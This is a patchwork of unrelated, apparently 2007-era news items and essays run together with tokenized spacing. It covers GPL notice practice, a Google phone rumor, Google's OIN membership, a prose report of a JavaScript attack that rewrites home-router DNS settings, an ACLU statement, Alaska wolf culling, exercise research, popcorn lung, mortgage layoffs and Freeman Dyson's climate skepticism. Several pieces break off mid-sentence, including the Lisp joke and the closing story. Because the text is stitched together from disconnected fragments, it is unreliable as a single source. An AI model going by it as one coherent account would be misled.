*/ ( Of course , you may remove " or ( at your option ) any later version " if you want to release only under GPLv2 .
Or , you may change the " 2 " to a " 3 " if your project is under GPLv3 . )
A very important issue here is the full preservation of the full copyright notice , permission notice , and disclaimer of warranty as they appeared in the original code .
Some common practice has cropped up whereby the GPL notice is placed somewhere mixed in with the other more permissive notice .
That practice causes confusion and lack of clarity both about the provenance of the code and the exact permissions that were granted by various copyright holders on it .
When different copyright holders are releasing their software under different terms , be sure to make it clear who has given which terms .
Making a clear separation and using indenting ( as done in the example above ) is therefore recommended .
Once the notices in the file are organized this way , new authors can now make a choice about whether they wish to contribute under the more permissive terms , or the GPL .
If they wish their contributions to be made available under the permissive terms , they can add their copyright notices to the lower group .
If they wish to contribute under GPL , they can add their copyright notices at the top .
It should be duly noted , however , that in a single file , it 's extremely difficult and perhaps completely infeasible to show which parts are under the more permissive terms .
If the goal is to make more code available under the permissive terms only , the method described in " Situation 2 " should be employed .
Situation 2 : Keeping Modified Files With Permissive Permissions Inside Larger GPL'd Works Sometimes , for the sake of continued collaboration with projects that prefer more permissive terms , GPL 'd project maintainers wish to section off code that will always remain under the more permissive terms .
This is particularly of interest to developers who wish to allow some parts of their work to remain available to other projects under the more permissive terms .
The most common example is a project that is primarily under GPL but includes some code that can be shared with a project under the very permissive ISC license ( sometimes called the 2 - clause BSD license ) .
Typically , when contributions are made to a GPL'd project , they are done under the terms of the GPL .
If maintainers have some files that must always remain under more permissive terms , the stewards of the codebase should take great care to obtain explicit assent from each contributor to the file in question .
The contributor should indicate agreement that the changes available under the permissive terms , not GPL .
Careful attention to legal detail must be made here .
When working in a large GPL 'd codebase , it is very easy to change the work in a way that causes the GPL to cover files previously covered only by more permissive terms .
This is particularly true when cross - file patchsets are accepted from developers .
GPL 'd projects that try to keep some of their code under more permissive licenses should collect an email or other direct statement from each patcher of the file indicating that the patcher wishes his changes to remain under the more permissive license .
Whenever possible , the stewards of the codebase should consult with a lawyer to be sure that the file is sufficiently independent from the core of the GPL'd program to constitute a separate , non-derivative work .
FOOTNOTE [ 1 ]
The file - by - file copyright and license notice method is steeped in 20 years of tradition in the software freedom community .
However , it is in some ways ill - advised , because of the heavy burden of individual file change tracking that must be done to insure that the notices stay correct .
Project leaders are generally advised to begin reconsidering this approach , as it is quite error - prone and can often lead to inadvertent ( albeit typically minor ) copyright infringement or improper attribution .

Before Gore
D.C. resident John Lockwood was conducting research at the Library of Congress and came across an intriguing Page 2 headline in the Nov. 2 , 1922 edition of The Washington Post : “ Arctic Ocean Getting Warm ; Seals Vanish and Icebergs Melt . ”
The 1922 article , obtained by Inside the Beltway , goes on to mention “ great masses of ice have now been replaced by moraines of earth and stones , ” and “ at many points well - known glaciers have entirely disappeared . ”
“ This was one of several such articles I have found at the Library of Congress for the 1920s and 1930s , ” says Mr. Lockwood .
“ I had read of the just - released NASA estimates , that four of the 10 hottest years in the U.S. were actually in the 1930s , with 1934 the hottest of all . ”
Worth pondering
Reacting yesterday to word that certain European governments and officials are suddenly trying to abandon their costly “ global warming ” policies , Royal Astronomical Society fellow Benny Peiser , of the science faculty at Liverpool John Moores University in Great Britain , recalls the teachings of Marcus Aurelius :
“ The object of life is not to be on the side of the majority , but to escape finding oneself in the ranks of the insane . ”
Darker dome
The Architect of the Capitol estimates that by having installed energy - efficient comfort - control systems and lighting , including occupancy sensors that automatically turn off lights when they are not needed , they are saving American taxpayers more than $ 2.2 million per year .
No pun intended
Pair of headlines as positioned for release yesterday by the Associated Press :
“ Karl Rove to Resign at End of August . ”
“ Stock Futures Point to Higher Open . ”
Cleavage surge
The Global Language Monitor ( GLM ) , a U.S. - based assemblage of academics , wordsmiths and bibliophiles that analyzes and catalogues the latest trends in word usage , word choices and their effect , just completed its first ranking of top “ political buzzwords ” for the first half of 2007 .
For instance , the 2006 list of the most popular buzzwords — terms or phrases that become loaded with emotional freight beyond the normal meaning of the word — included “ global warming , ” “ insurgency , ” “ credibility , ” “ throes , ” and “ quagmire . ”
Now we see the effect of the early start to the 2008 presidential campaign , with the top buzzwords “ Obama , ” “ cleavage , ” “ You Tube , ” “ Live Earth , ” “ surge , ” “ all - time low , ” “ subpoena , ” “ ’ I do n’t recall ’ ” and “ pardon . ”
“ This disparate collection of buzzwords speaks volumes about today ’s electorate , ” said GLM President Paul J.J. Payack .
“ We have an Iraq war strategy , a name , a corporate entity , and a commentary on a female candidate ’s ‘ neckline ’ at the top of the list . ”
Further explaining the emotional aspect of buzzwords , Mr. Payack points out that the word “ surge ” has been in the English - language vocabulary since time immemorial .
However , in its new context as an Iraq
War strategy , it inspires a set of emotions in many people far beyond the norm .
Record fines
The Federal Election Commission collected civil penalties totaling more than $ 2.2 million during the first six months of 2007 , the second - largest half - year total of any year in FEC history .
In one case , the FEC collected a $ 750,000 penalty from the conservative Progress for America ( PFA ) Voter Fund , the third - largest penalty in the commission ’s history .
Under the terms of the settlement , the PFA did not admit to any wrongdoing , but said it agrees “ to register as a political committee if it undertakes any activities similar to those in 2004 . ”
It was in 2004 , at a reported cost of $ 14 million , that the PFA produced and aired the highly emotional “ Ashley ’s Story , ” a campaign ad that was televised 30,000 times in the four weeks leading up the 2004 presidential election .
It showed President Bush hugging 15 - year - old Ashley Faulkner , who lost her mother in the September 11 , 2001 , terror attacks .
More recently , the PFA produced pro-Iraq - War ads , calling the conflict essential to fighting terrorism .

Can it be true ?
Is the Googlephone nigh at hand ?
Not that we have n't been hearing this time after time ( after time after time , etc. ) , but we 've actually got some hot news from a number of very trustworthy sources about Google 's plans for the mobile space .
Namely , Google 's mobile device platform is well on its way , and will be announced in the very near future .
We understand that the " Gphone OS " ( our name for it , not theirs ) began development after Google 's very quiet 2005 acquisition of mobile software company Android , started by Danger cofounder and former - prez / CEO Andy Rubin .
At Google , Andy 's team has developed a Linux - based mobile device OS ( no surprise ) which they 're currently shopping around to handset makers and carriers on the premise of providing a flexible , customizable system -- with really great Google integration , of course .
As for the timeframe on this thing , we keep hearing Google will announce its mobile plans some time post - Labor Day ( September 3rd ) ; from what we 've heard Google is n't necessarily working on hardware of its own , but is definitely working with OEMs and ODMs to get them to put the Gphone OS on upcoming devices .
Think of it more in terms of Windows Mobile or Palm OS ( in the early days ) --
Google wants to supply the platform , but we do n't think they want to sell hardware .
Still , do n't entirely rule out the idea .
Andy Rubin knows how to make a device and put it in peoples ' hands , so nothing is impossible on the hardware side .
Either way , we 're totally stoked to peep the software , we 've been waiting for the Googlephone for years on years .
Still , we can't help wondering what El Jobso thinks about all this .
Apple has been so buddy - buddy with Google lately , especially on the iPhone -- and now Apple 's mobile team is on the verge of outright competition with one of its closest partners .
We know that 's how the industry works , but it 's got to sting a little , you know ?
' Indians world 's most undemocratic people '
March 04 , 2007 14:51 IST
Indians are perhaps the world 's most undemocratic people , living in the world 's largest and most plural democracy where a person 's self - worth is almost exclusively determined by the rank he occupies , says a new book .
A profoundly hierarchical society , in India the determination of relative rank ( is this person superior or inferior to me ? ) remains very near the top of subconscious questions evoked in an interpersonal encounter , says the book The Indians : Portrait of a People by psychoanalyst and culture commentator Sudhir Kakkar and anthropologist Katherina Kakkar .
The gratification of the 300 million middleclass consumers , the new Brahmins , does not lie in their being consumers in a global marketplace , but in being somebody in a profoundly hierarchical society , the authors say .
You must be somebody to survive with dignity , since rank is the only substitute for money .
Thus retired judges , ex-ambassadors and other sundry officials who are no longer in service are never caught without calling cards prominently displaying who they once were , the authors say .
Irrespective of his educational status and more than in any other culture in the world , an Indian is a homohierarchicus , the book says .
Although at first glance , the notion of Indianness among the 1 billion population speaking 14 major languages with pronounced regional differences may seem far - fetched , yet from ancient times European , Chinese and Arab travellers have identified common features among India 's peoples , it says .
Do Lisp Programmers Really Exist ?
Do Lisp Programmers Really Exist ?
There have been several attempts at proving the existence of LISP programmers .
However , these have suffered from a serious lack of standardization .
Nobody could actually say what this LISP programmer is or how he looks like .
In the end , through considerable effort , most partisans of the LISP programmer theory have reached a common conclusion :
Google has joined the fight to save Linux from an army of patent - waving Microsoft lawyers .
With Redmond threatening to collect royalties from Linux users and distributors across the industry , claiming that the open - source operating system violates 235 of its patents , Google has thrown its considerable weight behind the Open Invention Network ( OIN ) , a consortium of companies bent on protecting open - source software from legal attack .
All OIN members - including big names such as IBM , NEC , Novell , Philips , Red Hat , and Sony , as well as Google - agree not to use their Linux - related patents against each other , and all have free access to a collection of additional open - source - related patents purchased by the consortium as a whole .
" Patent issues ... become a much smaller concern inside the community , and OIN members can focus their energy on writing and releasing software rather than vetting their code for intellectual property issues , " wrote Google open source programs manager Chris DiBona on The Official Google Blog .
" It 's the legal equivalent of taking a long , deep breath . "
As more names join the OIN , pooling more and more Linux - related patents , it becomes increasingly difficult for a company like Microsoft launch an attack on the OS .
" We are very open about our patents , " OIN chief executive officer Jerry Rosenthal told The Reg .
" We list them on our website , so that people who might want to do Linux harm understand why it would not be in their interest to bring litigation . "
Knowing they 're protected by the OIN , Google 's DiBona argues , open source developers are more likely to drive the industry forward : " We believe Linux innovation moves fastest when developers can share their knowledge with full peace of mind .
We 're proud to participate in an organization that 's making that possible , and we look forward to seeing OIN grow and thrive . "
Google is OIN 's first " end-user licensee , " which means it 's the only member who does n't sell , distribute , or develop Linux code .
It only uses the OS within the company .
" Google is such a well - recognized and well - thought - of name , we 'll now see other end - users become licensees , " said Rosenthal .
" We want to continue to grow this ecosystem of patents , so that ultimately a vast majority of [ Linux - related ] patents will be available to the community for free . "
According to DiBona , Google 's in - house open - source gurus are fond of saying " Every time you use Google , you 're using Linux ... Check a Google engineer 's workstation , and you 'll probably find it 's running Linux , " he explained .
" Do a search on Google.com , and a Linux server will return your results .
Ever since Google got its start , Linux has given us the power and flexibility we need to serve millions of users around the world . "
That puts the company squarely in the sights of Microsoft general counsel Brad Smith and licensing chief Horacio Gutierrez , who recently told Fortune that Redmond plans to use 235 of its OS patents to collect royalties from Linux users and distributors alike .
To date , the OIN has purchased more than 100 worldwide patents and patent applications involving Linux - and that does n't include the patents individually owned by its members .
The difference , Rosenthal says , is that unlike Microsoft , the OIN is completely open about its patents and uses them strictly for defensive purposes .
" Microsoft says they have 200 some Linux patents , but they wo n't tell us what they are , " he told us .
" That 's just an attempt to spread fear , uncertainty , and doubt .
It they tell us what the patents are , then we can deal with it , but they wo n't .
It makes you wonder they really have . " ®

Sid Stamm , Zulfikar Ramzan , and Markus Jakobsson have developed a clever , and potentially devastating , attack against home routers .
First , the attacker creates a web page containing a simple piece of malicious JavaScript code .
When the page is viewed , the code makes a login attempt into the user ’s home broadband router , and then attempts to change its DNS server settings to point to an attacker - controlled DNS server .
Once the user ’s machine receives the updated DNS settings from the router ( after the machine is rebooted ) future DNS requests are made to and resolved by the attacker ’s DNS server .
And then the attacker basically owns the victim ’s web connection .
The main condition for the attack to be successful is that the attacker can guess the router password .
This is surprisingly easy , since home routers come with a default password that is uniform and often never changed .
They ’ve written proof of concept code that can successfully carry out the steps of the attack on Linksys , D - Link , and NETGEAR home routers .
If users change their home broadband router passwords to something difficult to guess , they are safe from this attack .
Additional details ( as well as a nifty flash animation illustrating it ) can be found here .
There ’s also a paper on the attack .
And there ’s a Slashdot thread .
Cisco says that 77 of its routers are vulnerable .
Note that the attack does not require the user to download any malicious software ; simply viewing a web page with the malicious JavaScript code is enough .

WASHINGTON – In formal comments filed today with the Department of Homeland Security , the American Civil Liberties Union demanded that the Department of Homeland Security ( DHS ) shut down its illegal Automated Targeting System ( ATS ) program .
The program , which violates a congressional mandate barring DHS from assigning risk levels to ordinary Americans , uses secret criteria and computer algorithms to calculate the security risks of ordinary Americans .
" Congress has banned this type of program with good reason :
It rates the potential for terrorism of every traveler and violates every American ’s right to privacy , " said Barry Steinhardt , director of the ACLU Technology and Liberty Program .
" The judgments about Americans calculated by ATS will be stored for years , and we have no idea how they may be used in the future .
The benefit to the government is extremely questionable , but the consequences for Americans are simply dangerous . "
The ACLU has urged the Department of Homeland Security to end the program since its existence was revealed last November .
As part of the last three DHS appropriations acts , legislators have forbidden DHS from developing or testing any program that uses algorithms to calculate the security risks of ordinary Americans whose names are not on watch lists .
ATS ranks citizens using unknown but inevitably imprecise algorithms and draws from databases with known errors .
Even security officials , including the Secure Flight Working Group , have said they cannot determine who will be a threat from the characteristics ATS uses .
" No government has the right to say to law abiding citizens : ‘ Sorry , we ca n’t let you travel freely , but we ca n’t tell you why because it ’s secret ’ – especially in America , " said ACLU Senior Legislative Counsel Tim Sparapani .
" ATS is n’t just a flawed program – it ’s an illegal one .
Secret algorithms and bureaucratic black magic are not the answer to national security problems . "
The program was approved without public or congressional consideration , despite Congress ’s ban on these types of tracking systems used for people .
The government tracked cargo using a similar system , but it has never been given congressional approval to track people as cargo has been tracked .
The ACLU filed its formal comments on ATS in response to a Notice of Proposed Rulemaking published on August 6 in the Federal Register .
" In spite of broad public outcry , the substance and most of the details of the program remain the same – including its most objectionable elements , " said the ACLU in its comments to DHS .
" The Department of Homeland Security must curb the excesses of ATS and end its continuing and illegal efforts to categorize innocent travelers as security risks based on computer analysis .
If DHS is unwilling to act Congress should take further action to end ATS and protect the privacy of travelers . "

ANCHORAGE , Alaska ( Reuters ) - Hunters will now get cash and other incentives to kill wolves under Alaska ’s predator - control program that aims to protect moose populations , state officials said on Wednesday .
Alaska ’s Department of Fish and Game announced it will give $ 150 for every left foreleg of a wolf killed in the five areas where state officials are hoping to cull packs .
The incentives are an extension of Alaska ’s controversial aerial wolf - control program , which allows hunters with permits to shoot the animals from aircraft .
The department said it will also seek to raise the number of permits for hunters who kill wolves from aircraft , fly state biologists to help find wolves for hunters and , if those efforts fall short , have state workers track and kill wolves by helicopter .
Department officials said the $ 150 payment is not a bounty but an incentive for hunters to collect specimens that will be used for biological study .
“ The distinction we ’re trying to draw here is that in the bad old days bounties were put on things for elimination .
They were broad - based , ” said Ron Clarke , assistant director of the department ’s Division of Wildlife Conservation .
The new plan , he said , is a directed effort that seeks to provide scientific information .
Clarke said the incentives and help were needed because only 114 wolves have been killed this winter in the five targeted regions of interior Alaska , far less than the department ’s goal of 382 to 664 animals .
High winds and sparse snow have made it difficult to track wolves from the air and high fuel costs have made it expensive for aerial hunters , he said .
One opponent of the wolf - control program rejected the department ’s description of the $ 150 payout .
“ You can use whatever euphemism and call it an incentive or whatever double - speak trips your trigger but it strikes us as a bounty , ” said John Toppenberg , director of the Alaska Wildlife Alliance .
“ What the state is involved in here has more to do with animal husbandry than science , the elimination of one species to artificially inflate another . ”
The aerial - hunter program was started by former Gov. Frank Murkowski in 2003 and continued by his successor , Sarah Palin .
It has prompted tourism boycotts and ballot initiatives .
As if joggling in and of itself was not a good enough reason to learn to juggle , here is an article from jugglingworld .
biz that lists 8 physical benefits of juggling .
I summarized their list and added a couple extra because nobody makes top 8 lists .
Benefits of juggling
1. Juggling is great aerobic exercise .
It ’s certainly more fun than one of those stupid elliptical machines .
You ’re more apt to keep at it .
2. Juggling improves your hand - eye coordination .
This will be useful in other sports like kickball , softball , and volleyball .
3. Juggling makes you ambidextrous .
Very useful if you ever break your arm .
4. Juggling keeps you warm .
As long as you do n’t sweat too much .
5. Juggling improves balance .
Before I learned to juggle I could n’t even ride a unicycle .
But I can now !
6. Juggling improves motor skills .
Catching , throwing , hand - eye coordination are all improved with juggling .
7. Juggling improves your rhythm .
My wife can tell you what a great dancer I ’ve become since learning to juggle .
8. Juggling relieves stress .
Work or life getting you down ?
Just juggle it right out .
Juggling requires concentration and this will help you forget about your troubles .
And I thought I ’d add a couple of my own for the jogglers out there .
9. Juggling makes you smarter .
At least juggling can make your brain bigger according to this study .
10 . Juggling gives a a sense of accomplishment .
There are always new challenges in juggling .
New patterns , new equipment .
When you want to get an ego boost , learn a new juggling trick .
It ’s incredibly satisfying .
Scientists examining the relationship between the intensity and length of a workout and the duration of its benefits have made a surprising discovery :
More is n't necessarily better , and none may be worse than we ever imagined .
" On the surface , it seems to make sense that the harder we exercise , the better off we 'll be , and by some measures that 's true , " says lead author Cris Slentz , Ph.D , an exercise physiologist at Duke University Medical Center .
" But our studies show that a modest amount of moderately intense exercise is the best way to significantly lower the level of a key blood marker linked to higher risk of heart disease and diabetes .
More intense exercise does n't seem to do that . "
What may be even more remarkable , he says , is that some of the benefits derived from a modest exercise regimen appear to last much longer than those gained from a more rigorous program .
The study was funded by the National Heart , Lung , and Blood Institute of the National Institutes of Health and is slated for the August issue of the Journal of Applied Physiology .
Slentz , along with senior author William , Kraus , M.D. , a Duke cardiologist , studied 240 middle - aged , sedentary people randomized into one of four groups .
Three of them were exercise groups : a high amount / high intensity group , a low amount / high intensity group and a low amount / moderate intensity group .
Members of the fourth group were controls , meaning they did n't do any exercise at all .
Workouts included time on a treadmill , an elliptical trainer and a stationary bicycle .
Participants went through a two - to - three month ramp - up period , then stayed on their programs for six months .
Scientists measured the participants ' blood levels of proteins that carry cholesterol and fat ( HDL , LDL and triglycerides ) at the beginning of their programs , and then at 24 hours , five days , and 15 days after they ended .
( The trial is called STRRIDE : Studies of a Targeted Risk Reduction Intervention Through Defined Exercise . )
The researchers were especially interested in what happened after the participants stopped their workouts .
" There are lots of studies that demonstrate the benefits of exercise , but we also know that in real life , people do n't always adhere to their programs , so we wanted to measure how long those benefits linger , " says Slentz .
Such studies may help scientists understand why certain changes with exercise occur in the first place , and that may ultimately help them design more tailored programs for people who want to improve their health .
The researchers found that for the most part , no amount of exercise significantly changed LDL levels .
HDL levels , however , tended to improve with the length and intensity of the workout , and that the benefit was sustained over time .
But perhaps the most interesting finding was that a modest , low - intensity workout – walking just 30 minutes per day , for example , dramatically lowered triglyceride levels .
Triglycerides are the particles that carry fat around in the body , and they 're also a good indicator of insulin resistance , a marker for diabetes .
Lowering triglyceride levels lowers risk of heart disease and diabetes .
" A proper exercise program appears to be able to lower a person 's insulin resistance in just a matter of days , " says Kraus .
" We were also amazed to see that the lower triglyceride levels stayed low even two weeks after the workouts ended . "
Longer , more intense workouts did n't have nearly the same impact , they say .
While the researchers were surprised by the amount and duration of the benefits from a modest exercise program , they say they were not surprised by the results from the control group .
" And they are alarming , " says Kraus .
Over six months , those participants gained two pounds and about a half an inch around the waist .
" That may not sound like much , but over a decade at that rate , that would mean an additional 40 pounds and ten inches , " he says .
" So doing a little is a whole lot better than doing nothing at all . "
So is it ever " safe " to take a break from an exercise program ?
Well , maybe not if you want to retain benefits that are likely to evaporate over a few days .
And consider this :
When asked why they did n't measure benefits beyond two weeks , Kraus said the trial 's review panel would n't allow it .
" They figured that if people were doing something good for themselves , it would be unethical to ask them to stop for longer than that . "

Exposure to synthetic butter in food production and flavoring plants has been linked to hundreds of cases of workers whose lungs have been damaged or destroyed .
Diacetyl is found naturally in milk , cheese , butter and other products .
Heated diacetyl becomes a vapor and , when inhaled over a long period of time , seems to lead the small airways in the lungs to become swollen and scarred .
Sufferers can breathe in deeply , but they have difficulty exhaling .
The severe form of the disease is called bronchiolitis obliterans or “ popcorn workers ’ lung , ” which can be fatal .
Dr. Cecile Rose , director of the occupational disease clinical programs at National Jewish Medical and Research Center in Denver , said that she first saw the Colorado man in February after another doctor could not figure out what was causing his distress .
Dr. Rose described the case in a recent letter to government agencies .
A furniture salesman , the man was becoming increasingly short of breath .
He had never smoked and was overweight .
His illness had been diagnosed as hypersensitivity pneumonitis , an inflammation of the lungs usually caused by chronic exposure to bacteria , mold or dust .
Farmers and bird enthusiasts are frequent sufferers .
But nothing in the Colorado man ’s history suggested that he was breathing in excessive amounts of mold or bird droppings , Dr. Rose said .
She has consulted to flavorings manufacturers for years about “ popcorn workers ’ lung , ” and said that something about the man ’s tests appeared similar to those of the workers .
“ I said to him , ‘ This is a very weird question , but bear with me .
But are you around a lot of popcorn ? ’ ” Dr. Rose asked .
“ His jaw dropped and he said , ‘ How could you possibly know that about me ?
I am Mr. Popcorn .
I love popcorn . ’ ”
The man told Dr. Rose that he had eaten microwave popcorn at least twice a day for more than 10 years .

When members of Dow Jones & Co. 's controlling Bancroft family gathered 10 days ago for a meeting at a Boston hotel , they expected a fight .
Some wanted to entertain a $ 5 billion bid for the company by Rupert Murdoch 's News Corp. , but Michael Elefante , a powerful Dow Jones director and family trustee , had opposed it .
Instead of a rebuff , the family members got a huge surprise : Mr. Elefante had switched sides .
Mr. Elefante , a partner at a law firm that had represented the family for decades , told the group that for Dow Jones to remain competitive , he now believed the family needed to explore a sale to Mr. Murdoch or another bidder , according to people familiar with the presentation .
A look inside the family 's deliberation shows four crucial factors laid the groundwork for the Bancrofts ' dramatic change of position .
One was the shift by Mr. Elefante , a Boston lawyer who oversees the family 's trusts .
A rift in the 34 - member family widened as an increasingly noisy wing , especially those in the younger generation , agitated for Mr. Murdoch 's offer to be considered .
In a presentation to the board weeks earlier about the deal 's pros and cons , Dow Jones Chief Executive Richard Zannino had starkly laid out to the family the downside of shutting the door .
Finally , competition was getting fiercer than ever , with business - information providers Reuters Group PLC and Thomson Corp. announcing merger plans .
All this made it harder for the family to resist the rich premium of Mr. Murdoch 's offer .
On Thursday evening , the new stance surfaced at a special Dow Jones board meeting .
The Bancroft family said in a statement that it wants to meet Mr. Murdoch to discuss his bid , and it will consider other bidders as well .
( Read the statement . )
The family , which controls 64 % of Dow Jones 's voting power , cautioned that a sale is n't a certainty .
But it said the " mission of Dow Jones may be better accomplished in combination or collaboration with another organization , which may include News Corp . "
A group of scientists working together with the Institute of Optics and Optical Technologies at the Technical University of Berlin claim to have discovered a way to store 500 GB worth of data on DVD - sized discs .
The scientists are members of the Microholas Project , coordinated by Dr. Susanna Orlic , which plans to double the storage capacity to 1TB by 2010 .
The Project aims to implement a microholographic recording techniques which record data to nanostructures in the recording process .
By combining multilayer storage and holographic multiplexing , " microholography " allows data to be stored in three dimensions .
The technology works by replacing the two - dimensional pit-land structures currently found on CDs and DVDs with microgratings , which are " holographically induced " using two laser beams .
In other words , instead of recording to a series of bumps and pits like standard CDs , the new technology creates three - dimensional holographic grids that can be used for reading and writing data throughout the physical structure of the disc .
In order to store data in multi-layer form , the beam is " focused to different depths inside the photopolymer layer , " which means that the beam can actually be raised and lowered to write to different altitudes of the three - dimensional holograohic grid .
As you might expect , the project is bullish on its prospects .
The discs are predicted to be inexpensive to produce , which the project hopes will translate into manufacturer interest .
Of course , there 's no word on what the recording devices would cost , and that 's a major part of the equation .
Blu -ray discs currently store 50 GB of data on a dual - layer disc , whereas HD - DVD can store 30 GB on its dual - layer offering .
Both formats have greater storage potential thanks to the possibility of adding additional layers .
By 2010 , we expect to see 100GB and 60 GB Blu-ray and HD DVD discs ( respectively ) available for recording use on PCs .
Microholographic discs ( MHD ) are transparent and are the same physical size as CDs and DVDs , but the discs being created by the Microholas Project effectively have ten layers with five different wavelengths .
The " prototype " discs are recordable and sport a 50 Mb / s data rate , but the group expects an " Advanced Device " with 1TB of storage and data transfer speeds in excess of 200 Mb/s by 2010 .
1TB optical discs sure would beat the old sneakernet !

Not only here in Arizona , but nationally , we ’ve seen mortgage companies and real - estate related companies start to go belly up or start to liquidate their workforce .
First Magnus / Great Southwest went bankrupt and lost their banking license , lenders are now being sued for the housing bubble blowup , and even one of the largest lenders , Countrywide , has started layoffs .
Not a great time to be in the biz , Yahoo agrees :
At the North Carolina offices of mortgage lender HomeBanc Corp. , Archie Clark is the only employee left .
But in a few days , he ’ll be gone , too .
When Clark finishes helping movers from the company ’s Atlanta headquarters collect computers and other property , he ’ll join the more than 25,000 workers nationwide who have lost jobs in the financial services industry since the beginning of the month — with more than half coming since last Friday .
More layoffs are announced daily .
On Wednesday , Lehman Brothers Holdings Inc. closed its “ subprime ” mortgage business , laying off 1,200 workers at 23 offices ; Scottsdale , Ariz . - based 1st National Bank Holding Co. closed its wholesale mortgage unit and cut 541 jobs , and Accredited Home Lenders Holding Co. added 1,600 positions to the heap .
The night before , banking giant HSBC said it would close a main financing office and cut 600 jobs .
Since the start of the year , more than 40,000 workers have lost their jobs at mortgage lending institutions , according to recent company layoff announcements and data complied by global outplacement firm Challenger , Gray & Christmas Inc .
Meanwhile , construction companies have announced nearly 20,000 job cuts this year , while the National Association of Realtors expects membership rolls to decline this year for the first time in a decade .
“ It ’s far from over , ” said Bart Narter , a senior analyst with Celent , a Boston - based financial research and consulting firm .
“ The subprime lending collapse will continue to ripple through the financial sector . ”
For five years , the nation ’s housing market was booming and mortgage companies grew quickly , at times offering lucrative jobs to people with little experience .
But as home values declined and interest rates rose in the past year , rising delinquencies and defaults — especially in subprime mortgages targeted at borrowers with risky credit — have pounded lenders who could n’t keep pace .
“ These kind of mortgage lenders just sprung up like mushrooms and grew like men , ” said John A. Challenger , chief executive at Challenger , Gray & Christmas .
“ They staffed up and now you have a bust . ”
…
Andy Roach did n’t foresee the turmoil when he joined Greenpoint in March .
As late as June , the 25 - year industry veteran thought the business of making “ Alternative A ” mortgage loans — geared for those with slightly better credit than subprime borrowers — was on a solid track .
But in July , he said , spooked investors stopped buying the securities the company sold by repackaging the loans .
A little more than a month later , Capital One announced that Roach and about 1,900 of his colleagues across the country were out of a job .
“ It was pretty much a free for all in the office , people taking paper , stuff HomeBanc would n’t need , ” he said .
“ I do n’t feel like HomeBanc did anything .
It was a perfect storm of a bad housing market . ”
Two of Clark ’s friends have already landed jobs with Countrywide .
Another found work with an affiliate of First Magnus , and was almost immediately laid off again .
British - born physicist Freeman Dyson has revealed three " heresies " , two of which challenge the current scientific orthodoxy that anthropogenic carbon causes climate change .
" The fuss about global warming is grossly exaggerated , " writes Dyson in his new book Many Colored Glass : Reflections on the Place of Life in the Universe , published on Wednesday .
He pours scorn on " the holy brotherhood of climate model experts and the crowd of deluded citizens who believe the numbers predicted by the computer models " .
" I have studied the climate models and I know what they can do .
The models solve the equations of fluid dynamics , and they do a very good job of describing the fluid motions of the atmosphere and the oceans .
They do a very poor job of describing the clouds , the dust , the chemistry , and the biology of fields and farms and forests , " writes Dyson .
Biomass holds the key to carbon , he writes - leaving us to infer that he thinks the human contribution is negligible .
Overall , Dyson issues a plea for more scientific research into the behaviour of the planet 's biomass .
" Many of the basic processes of planetary ecology are poorly understood .
They must be better understood before we can reach an accurate diagnosis of the present condition of our planet , " he says .
" We do not know whether intelligent land management could increase the growth of the topsoil reservoir by four billion tons of carbon per year , the amount needed to stop the increase of carbon dioxide in the atmosphere .
All we can say for sure is that this is a theoretical possibility and ought to be seriously explored . "
That 's the first heresy - and it's not the first time he 's made it .
For several years , Dyson has argued that the carbon religion is self - indulgent , when there are more urgent , fixable problems to face :
" I 'm not saying the warming does n't cause problems , obviously it does , " he told students two years ago .
" Obviously we should be trying to understand it .
I 'm saying that the problems are being grossly exaggerated .
They take away money and attention from other problems that are much more urgent and important .
Poverty , infectious diseases , public education , and public health .
Not to mention the preservation of living creatures on land and in the oceans . "
The second heresy is that " warming " might not be such a bad thing .
" If we could choose between the climate of today with a dry Sahara and the climate of 6,000 years ago with a wet Sahara , should we prefer the climate of today ?
My second heresy answers yes to the first question and no to the second .
It says that the warm climate of 6,000 years ago with the wet Sahara is to be preferred , and that increasing carbon dioxide in the atmosphere may help to bring it back .
I am not saying that this heresy is true .
I am only saying that it will not do us any harm to think about it . "
The third heresy , you can read for yourselves here .
It 's not such a heresy as the other two , but how long those remain heresies is a moot point .
Dyson can expect another round of crucifixion with the predictable chorus that he's not a climate " scientist " .
His contention , that the models are n't really science when they 're programmed to produce the expected results , will no doubt be overlooked . ®
The Chinese food scandal continues to multiply .
There is now little doubt that Chinese food imports have entered the United States food supply in widespread and unexpected ways .
For instance , a former FDA official , William Hubbard , was quoted in the New York Times as saying that most of the candy in supermarket aisles is “ likely made with at least one ingredient that originated ” in China .
Even organic products are not immune from Chinese ingredients .
According to the Organic Consumers Association , Dean Foods , maker of the popular “ organic ” Silk soymilk , uses Chinese soybeans in their soymilk .
With soybeans being such a ubiquitous crop in the United States , who would ’ve ever thunk it ?
I know I did n’t !
As this blog has discussed in previous posts , the American public is in blissful ignorance of how widespread Chinese ingredients are in their food supply .
This is because of a little - known loophole in the food labeling laws that does not require country of origin for food ingredients if the product has been processed and has undergone substantial transformation .
Even if Chinese food ingredients have not been tainted outright with poisonous chemicals such as melamine , formaldehyde , etc. , the Wall Street Journal has reported a new threat from Chinese food ingredients — namely heavy metals , such as cadmium , mercury and lead contamination .
According to the Journal there is much Chinese farmland in the vicinity of factory smokestacks or mining operations .
This farmland has been contaminated by heavy metals that can cause a “ sweeping range of health problems from brain damage to cancer . ”
This contamination is not just mere conjecture ; according to the Journal , some Chinese have recently been poisoned with contaminated rice that “ contained 20 times permitted levels of cadmium . ”
Vegetable crops have been poisoned too .
According to the Journal , heavy use of fertilizers , contaminated with metals and other toxins , is widespread .
Despite all of this , in the United States , the FDA does no routine testing of food imports for metals .
Given this , we have no way to know how widespread the problem is .
Richard Maybury has summarized the basic laws that allow civilizations to progress .
One of these laws is : “ Do all that you have agreed to do . ”
Food manufactures that take advantage of the loophole in the food labeling requirements and use potentially contaminated ingredients are not doing all that they have agreed to do .
Why ?
If a consumer buys a product in the supermarket there is an implicit understanding that the product is not contaminated in any way with tainted ingredients or heavy metals .
Let ’s leave aside the economics of how regulatory agencies are frequently “ captured ” by the industries that they are supposed to regulate .
Instead , let us focus on the dubious ethics of many food manufacturers who are taking advantage of this loophole in the law .
By not doing all that they have agreed to do — that is , delivering a food product free from contamination –they are undermining the market system .
The consumer suffers twice .
The first effect is being exposed , unwittingly , to contaminated food .
The second effect is more systemic .
When consumers can no longer trust the word of the companies that they are buying from , commerce and the economy begin to slow .
In that way , we all suffer .

It was 9 p.m. on Saturday , and Lián Amaris Sifuentes was taking her time getting ready for a date , doing the usual things : looking in the mirror , taking a disco nap , drinking a glass of wine .
Sure , as Yeats said , women must labor to be beautiful , but you would think Ms. Sifuentes would labor a little more quickly , considering that she was doing all of this on a traffic island at the southeast corner of Union Square .
